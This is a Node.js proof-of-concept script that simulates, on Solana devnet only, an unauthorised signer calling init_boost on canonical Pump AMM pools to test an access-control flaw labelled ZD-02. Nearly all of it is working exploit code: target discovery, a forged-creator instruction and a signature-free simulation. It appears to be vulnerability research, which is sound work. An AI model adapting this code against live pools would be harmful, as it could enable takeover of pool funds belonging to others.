import fs from "node:fs";
import { BorshCoder } from "@coral-xyz/anchor";
import {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  NATIVE_MINT,
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";
import bs58 from "bs58";

const PUMP_AMM = new PublicKey("pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA");
const PUMP = new PublicKey("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P");
const GLOBAL_CONFIG = new PublicKey("ADyA8hdefvWN2dbGGWFotbzWxrAvLW83WG6QCVXvJKqw");
const DEVNET_GENESIS = "EtWTRABZaYq6iMfeYKouRu166VU2xqa1wcaWoxPkrZBG";
const RPC = process.env.DEVNET_RPC || "https://api.devnet.solana.com";

function emit(status, extra = {}) {
  console.log(JSON.stringify({ status, ...extra }, null, 2));
}
function tokenAmount(data) {
  return data && data.length >= 72 ? data.readBigUInt64LE(64) : null;
}
function pubkeyAt(buf, start) {
  return new PublicKey(buf.subarray(start, start + 32));
}
function simData(entry) {
  if (!entry?.data) return null;
  return Buffer.from(Array.isArray(entry.data) ? entry.data[0] : entry.data, "base64");
}
async function getMany(connection, keys) {
  const out = [];
  for (let i = 0; i < keys.length; i += 100) {
    out.push(...await connection.getMultipleAccountsInfo(keys.slice(i, i + 100), "confirmed"));
  }
  return out;
}
async function rawSimulate(serialized, addresses) {
  const r = await fetch(RPC, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0", id: 1, method: "simulateTransaction",
      params: [serialized.toString("base64"), {
        encoding: "base64",
        commitment: "confirmed",
        sigVerify: false,
        replaceRecentBlockhash: true,
        accounts: { encoding: "base64", addresses: addresses.map(String) },
      }],
    }),
  });
  const j = await r.json();
  if (j.error) throw new Error(JSON.stringify(j.error));
  return j.result.value;
}

const connection = new Connection(RPC, "confirmed");
const genesis = await connection.getGenesisHash();
if (genesis !== DEVNET_GENESIS) {
  emit("SAFETY_ABORT_NOT_DEVNET", { genesis });
  process.exit(2);
}
console.log(`SAFETY_GATE devnet genesis verified: ${genesis}`);

const idl = JSON.parse(fs.readFileSync(new URL("../../idl/pump_amm.json", import.meta.url), "utf8"));
const coder = new BorshCoder(idl);
const globalInfo = await connection.getAccountInfo(GLOBAL_CONFIG, "confirmed");
if (!globalInfo) throw new Error("Devnet GlobalConfig missing");
const global = coder.accounts.decode("GlobalConfig", globalInfo.data);
const globalAdmin = new PublicKey(global.admin);
const boostAuthority = new PublicKey(global.boostAuthority ?? global.boost_authority);
const boostEnabled = Boolean(global.boostEnabled ?? global.boost_enabled);
console.log(JSON.stringify({ globalAdmin: globalAdmin.toBase58(), boostAuthority: boostAuthority.toBase58(), boostEnabled }, null, 2));

const poolDesc = idl.accounts.find((x) => x.name === "Pool");
const initDesc = idl.instructions.find((x) => x.name === "init_boost");
if (!poolDesc || !initDesc) throw new Error("required IDL descriptors missing");

// Pool layout (full account): discriminator 0..7, bump 8, index 9..10,
// creator 11..42, base_mint 43..74, quote_mint 75..106,
// lp_mint 107..138, pool_base 139..170, pool_quote 171..202,
// lp_supply 203..210, coin_creator 211..242, flags 243..244,
// virtual_quote_reserves i128 245..260.
const filters = [
  { memcmp: { offset: 0, bytes: bs58.encode(Buffer.from(poolDesc.discriminator)) } },
  { memcmp: { offset: 9, bytes: bs58.encode(Buffer.alloc(2)) } },
  { memcmp: { offset: 75, bytes: NATIVE_MINT.toBase58() } },
  { memcmp: { offset: 245, bytes: bs58.encode(Buffer.alloc(16)) } },
];
const rows = await connection.getProgramAccounts(PUMP_AMM, {
  commitment: "confirmed",
  filters,
  dataSlice: { offset: 8, length: 237 },
});

const canonical = [];
for (const { pubkey, account } of rows) {
  const d = account.data;
  if (d.length < 237) continue;
  const index = d.readUInt16LE(1);
  const creator = pubkeyAt(d, 3);
  const baseMint = pubkeyAt(d, 35);
  const quoteMint = pubkeyAt(d, 67);
  const poolBaseTokenAccount = pubkeyAt(d, 131);
  const poolQuoteTokenAccount = pubkeyAt(d, 163);
  const coinCreator = pubkeyAt(d, 203);
  const [expectedPumpCreator] = PublicKey.findProgramAddressSync(
    [Buffer.from("pool-authority"), baseMint.toBuffer()], PUMP,
  );
  if (!creator.equals(expectedPumpCreator)) continue;
  canonical.push({ pubkey, index, creator, baseMint, quoteMint, poolBaseTokenAccount, poolQuoteTokenAccount, coinCreator });
}
console.log(`INIT_DISCOVERY zero_virtual_wsol_pools=${rows.length} canonical_pump_pools=${canonical.length}`);
if (!canonical.length) {
  emit("INCONCLUSIVE_NO_CANONICAL_NONBOOST_POOL");
  process.exit(3);
}

// Choose a liquid canonical non-BOOST pool using batched reads, avoiding RPC spam.
const sample = canonical.slice(0, 200);
const quoteInfos = await getMany(connection, sample.map((x) => x.poolQuoteTokenAccount));
const ranked = sample.map((x, i) => ({ ...x, quoteBalance: tokenAmount(quoteInfos[i]?.data) ?? 0n }))
  .filter((x) => x.quoteBalance > 0n)
  .sort((a, b) => a.quoteBalance === b.quoteBalance ? 0 : a.quoteBalance > b.quoteBalance ? -1 : 1);
if (!ranked.length) {
  emit("INCONCLUSIVE_NO_LIQUID_CANONICAL_POOL");
  process.exit(4);
}

const top = ranked.slice(0, 30).map((x) => {
  const [boostVaultAuthority] = PublicKey.findProgramAddressSync([Buffer.from("boost_vault"), x.pubkey.toBuffer()], PUMP_AMM);
  const boostVault = getAssociatedTokenAddressSync(NATIVE_MINT, boostVaultAuthority, true, TOKEN_PROGRAM_ID);
  return { ...x, boostVaultAuthority, boostVault };
});
const boostInfos = await getMany(connection, top.map((x) => x.boostVault));
let target = null;
for (let i = 0; i < top.length; i++) {
  const existing = boostInfos[i];
  const amount = tokenAmount(existing?.data);
  if (!existing || amount === 0n) {
    target = { ...top[i], boostVaultBefore: amount };
    break;
  }
}
if (!target) {
  emit("INCONCLUSIVE_TOP_POOLS_ALREADY_HAVE_BOOST_VAULT", { checked: top.length });
  process.exit(5);
}

const attacker = Keypair.generate();
if (attacker.publicKey.equals(target.creator)) throw new Error("attacker collision");
const [eventAuthority] = PublicKey.findProgramAddressSync([Buffer.from("__event_authority")], PUMP_AMM);
const ix = new TransactionInstruction({
  programId: PUMP_AMM,
  keys: [
    { pubkey: target.pubkey, isSigner: false, isWritable: true },
    { pubkey: GLOBAL_CONFIG, isSigner: false, isWritable: false },
    { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
    { pubkey: target.baseMint, isSigner: false, isWritable: false },
    { pubkey: target.quoteMint, isSigner: false, isWritable: false },
    { pubkey: target.poolBaseTokenAccount, isSigner: false, isWritable: false },
    { pubkey: target.poolQuoteTokenAccount, isSigner: false, isWritable: true },
    { pubkey: target.boostVaultAuthority, isSigner: false, isWritable: false },
    { pubkey: target.boostVault, isSigner: false, isWritable: true },
    { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    { pubkey: ASSOCIATED_TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    { pubkey: eventAuthority, isSigner: false, isWritable: false },
    { pubkey: PUMP_AMM, isSigner: false, isWritable: false },
  ],
  data: Buffer.from(initDesc.discriminator),
});

// We only need program-level authorization semantics. The fee payer is not an
// init_boost instruction account; sigVerify=false avoids needing its private key.
// The external attacker IS the creator account seen by Pump AMM and is marked signer.
let fallbackPayer = target.coinCreator;
let fallbackBalance = await connection.getBalance(fallbackPayer, "confirmed");
if (fallbackPayer.equals(target.creator) || fallbackPayer.equals(globalAdmin) || fallbackPayer.equals(boostAuthority) || fallbackBalance < 100_000) {
  fallbackPayer = globalAdmin;
  fallbackBalance = await connection.getBalance(fallbackPayer, "confirmed");
}
if (fallbackBalance < 100_000) {
  emit("INCONCLUSIVE_NO_FUNDED_FEE_PAYER");
  process.exit(6);
}

const tx = new Transaction().add(ix);
tx.feePayer = fallbackPayer;
tx.recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
tx.partialSign(attacker);
const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });

console.log(JSON.stringify({
  test: "foreign signer init_boost on canonical non-BOOST Pump pool",
  pool: target.pubkey.toBase58(),
  expectedPoolCreator: target.creator.toBase58(),
  attackerCreator: attacker.publicKey.toBase58(),
  attackerEqualsExpectedCreator: attacker.publicKey.equals(target.creator),
  baseMint: target.baseMint.toBase58(),
  quoteMint: target.quoteMint.toBase58(),
  poolQuoteBalance: target.quoteBalance.toString(),
  boostVault: target.boostVault.toBase58(),
  boostVaultExistsBefore: target.boostVaultBefore !== null,
  boostVaultAmountBefore: target.boostVaultBefore?.toString() ?? null,
  feePayerNotInstructionAccount: fallbackPayer.toBase58(),
}, null, 2));

const result = await rawSimulate(serialized, [target.pubkey, target.poolQuoteTokenAccount, target.boostVault]);
console.log("--- INIT_BOOST SIMULATION LOGS ---");
for (const line of result.logs || []) console.log(line);
console.log("--- END LOGS ---");

const postPool = simData(result.accounts?.[0]);
const postQuote = simData(result.accounts?.[1]);
const postBoost = simData(result.accounts?.[2]);
const postBoostAmount = tokenAmount(postBoost);
const reachedSystemOrToken = (result.logs || []).some((x) => /Program (11111111111111111111111111111111|AToken|Tokenkeg)|Instruction: (Create|Transfer|SyncNative)/.test(x));

if (result.err === null) {
  emit("CONFIRMED_FOREIGN_INIT_BOOST_SIMULATION", {
    proof: "Pump AMM accepted init_boost with an external signer different from the canonical pool.creator PDA.",
    pool: target.pubkey.toBase58(),
    expectedPoolCreator: target.creator.toBase58(),
    attackerCreator: attacker.publicKey.toBase58(),
    reachedSystemOrToken,
    poolAccountReturned: Boolean(postPool),
    poolQuoteAfterSim: tokenAmount(postQuote)?.toString() ?? null,
    boostVaultAfterSim: postBoostAmount?.toString() ?? null,
  });
  process.exit(0);
}

emit("REJECTED_OR_INCONCLUSIVE_INIT_BOOST", {
  simulationError: result.err,
  pool: target.pubkey.toBase58(),
  expectedPoolCreator: target.creator.toBase58(),
  attackerCreator: attacker.publicKey.toBase58(),
  reachedSystemOrToken,
  boostVaultAfterSim: postBoostAmount?.toString() ?? null,
  note: "A creator/pool identity mismatch error kills ZD-02. A later rent/liquidity/system error means the foreign creator passed the identity boundary and needs a funded follow-up simulation.",
});
process.exit(12);
